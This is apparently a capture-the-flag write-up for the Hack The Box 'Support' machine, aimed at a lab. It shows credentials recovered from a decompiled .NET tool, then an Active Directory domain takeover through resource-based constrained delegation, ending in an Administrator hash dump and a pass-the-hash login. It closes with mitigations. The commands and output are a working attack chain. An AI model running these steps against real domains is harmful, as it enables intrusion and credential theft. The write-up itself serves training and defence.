---
layout: post
title: "HTB - Support"
categories: [writeup]
---

### **1. Walkthrough**

```
Nmap scan report for 10.129.230.181
Host is up (0.051s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-20 02:28:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-20T02:28:32
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: -6h55m47s
```

An initial port scan shows standard Windows services, including SMB (445). We start by enumerating accessible shares as an anonymous user. 

```bash
smbclient -N //10.129.230.181/support-tools
smb: \> get UserInfo.exe.zip
```

We find a share named support-tools that allows non-authenticated access. Inside, there is a ZIP archive.

```bash
unzip UserInfo.exe.zip -d UserInfo
  inflating: UserInfo/UserInfo.exe
```

We extract the archive to find a .NET executable, UserInfo.exe. Using dnSpy, we decompile the binary to analyze its logic.

We focus our attention on the UserInfo.Services namespace. Within the LdapQuery class, the constructor reveals hardcoded credentials used to connect to the DC via LDAP.

dnSpy
```csharp
LdapQuery @0x02000007
---
public LdapQuery()
{
        string password = Protected.getPassword();
        this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
        this.entry.AuthenticationType = AuthenticationTypes.Secure;
        this.ds = new DirectorySearcher(this.entry);
}
---
```
Looking further into the Protected class, we find the getPassword() method. It uses a simple XOR-based decryption routine with a hardcoded key (armando) and an encrypted base64 string.

```csharp
Protected @0x02000006
---
namespace UserInfo.Services
{
        // Token: 0x02000006 RID: 6
        internal class Protected
        {
                // Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
                public static string getPassword()
                {
                        byte[] array = Convert.FromBase64String(Protected.enc_password);
                        byte[] array2 = array;
                        for (int i = 0; i < array.Length; i++)
                        {
                                array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
                        }
                        return Encoding.Default.GetString(array2);
                }

                // Token: 0x04000005 RID: 5
                private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

                // Token: 0x04000006 RID: 6
                private static byte[] key = Encoding.ASCII.GetBytes("armando");
        }
}
---
```

We recreate the decryption logic in a Python script to recover the plaintext password.

```python
cat decrypt.py
---
import base64

def decrypt_password():
    enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
    key = "armando".encode('ascii')

    encrypted_bytes = base64.b64decode(enc_password)

    decrypted_bytes = bytearray()

    for i in range(len(encrypted_bytes)):
        char_decrypted = encrypted_bytes[i] ^ key[i % len(key)] ^ 223
        decrypted_bytes.append(char_decrypted)

    return decrypted_bytes.decode('utf-8')

password = decrypt_password()
print(f"Decrypted: {password}")
---
```

```bash
python3 decrypt.py
Decrypted: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

We now have valid domain credentials:

support.htb\ldap / nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

Using NetExec, we use the get-info-users module to dump interesting user attributes, the output reveals a password stored directly in the Info field for the support user.

```bash
nxc ldap DC -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-info-users
User: support              Info: Ironside47pleasure40Watchful
```

support.htb\support / Ironside47pleasure40Watchful

We test these new credentials and find they have WinRM access to the DC.

```bash
evil-winrm -i DC -u support -p Ironside47pleasure40Watchful
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
*Evil-WinRM* PS C:\Users\support\Desktop> .\sharphound.exe all
```

After uploading and running SharpHound to map the AD environment, we analyze the resulting data.

We discover a critical misconfiguration:

* Our user support is a member of the Shared Support Accounts group.
* This group has GenericAll rights over the DC (DC$).

GenericAll grants full control over the target object, including the ability to write to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. This is the perfect condition for a Resource-Based Constrained Delegation (RBCD) attack.

Kerberos requires strict time synchronization. We sync our Kali time with the target DC.

```bash
sudo ntpdate -s 10.129.230.181
```

Using Impacket's addcomputer.py, we leverage our support credentials to create a new computer account, exploit$. This account will serve as the allowed identity in our delegation configuration.

```bash
addcomputer.py -method SAMR -computer-name 'exploit$' -computer-pass 'Password123' -dc-host 10.129.230.181 support.htb/support:Ironside47pleasure40Watchful
[*] Successfully added machine account exploit$ with password Password123.
```

We use rbcd.py to write the Security Descriptor to the DC$ object. This specifies that our new exploit$ computer is allowed to impersonate other users when interacting with services on DC$.

```bash
rbcd.py -delegate-from 'exploit$' -delegate-to 'DC$' -action write support.htb/support:Ironside47pleasure40Watchful
[*] exploit$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     exploit$     (S-1-5-21-1677581083-3380853377-188903654-6101)
```

We use getST.py to perform the S4U2Proxy process. We request a Service Ticket for the cifs service on DC$ while impersonating the Administrator.

```bash
getST.py -spn 'cifs/DC.support.htb' -impersonate Administrator 'support.htb/exploit$:Password123'
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

We export the acquired ticket and use it to access the DC with administrative privileges.

```bash
export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache

secretsdump.py DC.support.htb -k -no-pass -just-dc-user Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::

evil-winrm -i DC -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

### **2. Lessons Learned**

**Information Disclosure**

The custom tool UserInfo.exe should never have hardcoded credentials, even if they are obfuscated or encrypted with simple schemes. XOR with a static key is trivial to reverse.

* Mitigation: Credentials should not be stored within client-side binaries. Authentication should be handled by a secure backend service. Publicly accessible shares should be regularly audited to ensure they do not contain sensitive tools or configuration files.

**Critical AD ACL Misconfigurations**

Granting GenericAll rights to a non-administrative group over a computer object (especially a DC) is a critical security flaw that directly enables domain takeover via RBCD.

* Mitigation: The Security Descriptor for all Computer Objects, particularly Domain Controllers, must be rigorously monitored and hardened. Rights like GenericAll, GenericWrite, and WriteProperty over Computer objects must only be granted to highly trusted administrative identities. Automated tools like BloodHound should be used to regularly scan for these dangerous relationships.
